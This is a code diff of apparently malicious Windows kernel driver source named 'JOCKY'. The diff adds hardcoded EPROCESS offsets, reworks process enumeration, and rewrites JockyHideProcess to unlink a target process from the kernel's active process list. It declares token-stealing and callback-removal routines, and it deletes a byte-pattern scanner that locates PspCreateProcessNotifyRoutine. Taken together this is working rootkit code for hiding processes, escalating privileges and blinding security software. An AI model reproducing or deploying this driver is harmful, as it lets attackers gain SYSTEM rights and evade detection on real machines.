@@ -1,5 +1,20 @@
 #include <ntddk.h>
 #include "IoctlCommon.h"
+typedef struct _SYSTEM_PROCESS_INFORMATION {
+    ULONG          NextEntryOffset;
+    ULONG          NumberOfThreads;
+    LARGE_INTEGER  Reserved[3];
+    LARGE_INTEGER  CreateTime;
+    LARGE_INTEGER  UserTime;
+    LARGE_INTEGER  KernelTime;
+    UNICODE_STRING ImageName;
+    KPRIORITY      BasePriority;
+    HANDLE         UniqueProcessId;
+    HANDLE         InheritedFromUniqueProcessId;
+    ULONG          HandleCount;
+    ULONG          SessionId;
+} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;
+
 typedef struct _LDR_DATA_TABLE_ENTRY {
     LIST_ENTRY     InLoadOrderLinks;
     LIST_ENTRY     InMemoryOrderLinks;
@@ -12,6 +27,17 @@ typedef struct _LDR_DATA_TABLE_ENTRY {
 } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
 
 extern LIST_ENTRY PsLoadedModuleList;
+NTKERNELAPI PCHAR PsGetProcessImageFileName(PEPROCESS Process);
+
+// Win10 21H2 offsets
+#define EPROCESS_TOKEN          0x4B8
+#define EPROCESS_UNIQUEPID      0x440
+#define EPROCESS_ACTIVELINKS    0x448
+
+// Forward declarations
+NTSTATUS JockyHideProcess(ULONG targetPid);
+NTSTATUS JockyStealToken(ULONG targetPid);
+NTSTATUS JockyRemoveCallbacks();
 
 ULONG_PTR GetNtoskrnlBase() {
     PLIST_ENTRY listHead = &PsLoadedModuleList;
@@ -139,30 +165,54 @@ NTSTATUS IoControlRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
         if (outBuf && outBufLen >= sizeof(PROCESS_LIST)) {
             RtlZeroMemory(outBuf, sizeof(PROCESS_LIST));
 
-            PEPROCESS proc = PsGetCurrentProcess();
-            PEPROCESS startProc = proc;
-            ULONG count = 0;
+            ULONG spiSize = 512 * 1024;
+            PVOID spiBuf = ExAllocatePoolWithTag(NonPagedPool, spiSize, 'kcoJ');
+            if (!spiBuf) {
+                status = STATUS_INSUFFICIENT_RESOURCES;
+            } else {
+                ULONG retLen = 0;
+                status = ZwQuerySystemInformation(
+                    (SYSTEM_INFORMATION_CLASS)5, // SystemProcessInformation
+                    spiBuf, spiSize, &retLen
+                );
 
-            do {
-                if (count >= MAX_PROCESSES) break;
+                if (NT_SUCCESS(status)) {
+                    PSYSTEM_PROCESS_INFORMATION entry =
+                        (PSYSTEM_PROCESS_INFORMATION)spiBuf;
+                    ULONG count = 0;
 
-                ULONG pid = (ULONG)(ULONG_PTR)PsGetProcessId(proc);
-                PCHAR name = (PCHAR)PsGetProcessImageFileName(proc);
+                    while (TRUE) {
+                        if (count < MAX_PROCESSES) {
+                            outBuf->Entries[count].Pid =
+                                (ULONG)(ULONG_PTR)entry->UniqueProcessId;
 
-                outBuf->Entries[count].Pid = pid;
-                RtlCopyMemory(outBuf->Entries[count].ImageName, name, 15);
-                outBuf->Entries[count].ImageName[15] = '\0';
-                count++;
+                            if (entry->ImageName.Buffer &&
+                                entry->ImageName.Length > 0) {
+                                ULONG nameLen =
+                                    entry->ImageName.Length / sizeof(WCHAR);
+                                if (nameLen > 15) nameLen = 15;
+                                for (ULONG j = 0; j < nameLen; j++)
+                                    outBuf->Entries[count].ImageName[j] =
+                                        (CHAR)entry->ImageName.Buffer[j];
+                                outBuf->Entries[count].ImageName[nameLen] = '\0';
+                            } else {
+                                RtlCopyMemory(outBuf->Entries[count].ImageName,
+                                              "System", 7);
+                            }
+                            count++;
+                        }
+                        if (entry->NextEntryOffset == 0) break;
+                        entry = (PSYSTEM_PROCESS_INFORMATION)(
+                            (UCHAR*)entry + entry->NextEntryOffset);
+                    }
 
-                PLIST_ENTRY flink = (PLIST_ENTRY)((ULONG_PTR)proc + 0x448);
-                proc = (PEPROCESS)((ULONG_PTR)flink->Flink - 0x448);
+                    outBuf->Count = count;
+                    bytesReturned = sizeof(PROCESS_LIST);
+                    DbgPrint("[JOCKY Driver] Enumerated %lu processes.\n", count);
+                }
 
-            } while (proc != startProc);
-
-            outBuf->Count = count;
-            bytesReturned = sizeof(PROCESS_LIST);
-            status = STATUS_SUCCESS;
-            DbgPrint("[JOCKY Driver] Enumerated %lu processes.\n", count);
+                ExFreePoolWithTag(spiBuf, 'kcoJ');
+            }
         } else {
             status = STATUS_BUFFER_TOO_SMALL;
         }
@@ -220,46 +270,25 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) 
 }
 
 NTSTATUS JockyHideProcess(ULONG targetPid) {
-    PEPROCESS proc = PsGetCurrentProcess();
-    PEPROCESS startProc = proc;
+    PEPROCESS proc = NULL;
+    NTSTATUS status = PsLookupProcessByProcessId(
+        (HANDLE)(ULONG_PTR)targetPid, &proc
+    );
+    if (!NT_SUCCESS(status)) {
+        DbgPrint("[JOCKY] PID %lu not found\n", targetPid);
+        return STATUS_NOT_FOUND;
+    }
 
-    do {
-        ULONG pid = (ULONG)(ULONG_PTR)PsGetProcessId(proc);
+    PLIST_ENTRY entry = (PLIST_ENTRY)((ULONG_PTR)proc + EPROCESS_ACTIVELINKS);
+    entry->Blink->Flink = entry->Flink;
+    entry->Flink->Blink = entry->Blink;
+    entry->Flink = entry;
+    entry->Blink = entry;
 
-        if (pid == targetPid) {
-            // Found target — unlink from ActiveProcessLinks
-            PLIST_ENTRY entry = (PLIST_ENTRY)(
-                (ULONG_PTR)proc + 0x448
-            );
-
-            // Relink previous and next entries around this one
-            entry->Blink->Flink = entry->Flink;
-            entry->Flink->Blink = entry->Blink;
-
-            // Point entry to itself — safe if anything walks it later
-            entry->Flink = entry;
-            entry->Blink = entry;
-
-            DbgPrint("[JOCKY] Process PID %lu hidden from list\n",
-                     targetPid);
-            return STATUS_SUCCESS;
-        }
-
-        PLIST_ENTRY flink = (PLIST_ENTRY)(
-            (ULONG_PTR)proc + 0x448
-        );
-        proc = (PEPROCESS)((ULONG_PTR)flink->Flink - 0x448);
-
-    } while (proc != startProc);
-
-    DbgPrint("[JOCKY] PID %lu not found\n", targetPid);
-    return STATUS_NOT_FOUND;
+    DbgPrint("[JOCKY] Process PID %lu hidden from list\n", targetPid);
+    ObDereferenceObject(proc);
+    return STATUS_SUCCESS;
 }
-
-// Win10 21H2 offsets
-#define EPROCESS_TOKEN          0x4B8
-#define EPROCESS_UNIQUEPID      0x440
-#define EPROCESS_ACTIVELINKS    0x448
 
 NTSTATUS JockyStealToken(ULONG targetPid) {
     PEPROCESS systemProc = NULL;
@@ -299,62 +328,6 @@ NTSTATUS JockyStealToken(ULONG targetPid) {
     ObDereferenceObject(systemProc);
     ObDereferenceObject(targetProc);
     return STATUS_SUCCESS;
-}
-
-// Pattern to find PspCreateProcessNotifyRoutine in ntoskrnl
-// This works on Win10 21H2 — pattern may differ on other builds
-// Found by scanning bytes around PsSetCreateProcessNotifyRoutine
-
-ULONG_PTR FindPspCreateProcessNotifyRoutine() {
-    // Get base of ntoskrnl
-    ULONG_PTR ntBase = 0;
-
-    // Walk loaded module list to find ntoskrnl base
-    PLIST_ENTRY moduleList = &PsLoadedModuleList;
-    PLIST_ENTRY entry = moduleList->Flink;
-
-    while (entry != moduleList) {
-        PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(
-            entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks
-        );
-
-        // ntoskrnl is the first entry in the list
-        ntBase = (ULONG_PTR)mod->DllBase;
-        break;
-    }
-
-    if (!ntBase) return 0;
-
-    // Scan for the byte pattern that precedes the array
-    // Pattern: 4C 8D 2D ?? ?? ?? ?? — lea r13, [PspCreateProcessNotifyRoutine]
-    // This is inside PsSetCreateProcessNotifyRoutine
-    UCHAR pattern[] = { 0x4C, 0x8D, 0x2D };
-    ULONG_PTR scanStart = ntBase;
-    ULONG_PTR scanEnd   = ntBase + 0x1000000; // scan 16MB
-
-    for (ULONG_PTR addr = scanStart; addr < scanEnd - 7; addr++) {
-        UCHAR* bytes = (UCHAR*)addr;
-
-        if (bytes[0] == pattern[0] &&
-            bytes[1] == pattern[1] &&
-            bytes[2] == pattern[2]) {
-
-            // Extract RIP-relative offset (bytes 3-6)
-            LONG offset = *(LONG*)(addr + 3);
-
-            // RIP at next instruction = addr + 7
-            ULONG_PTR target = addr + 7 + offset;
-
-            // Sanity check — must be in ntoskrnl range
-            if (target > ntBase && target < scanEnd) {
-                DbgPrint("[JOCKY] Found PspCreateProcessNotifyRoutine"
-                         " at 0x%llX\n", target);
-                return target;
-            }
-        }
-    }
-
-    return 0;
 }
 
 NTSTATUS JockyRemoveCallbacks() {
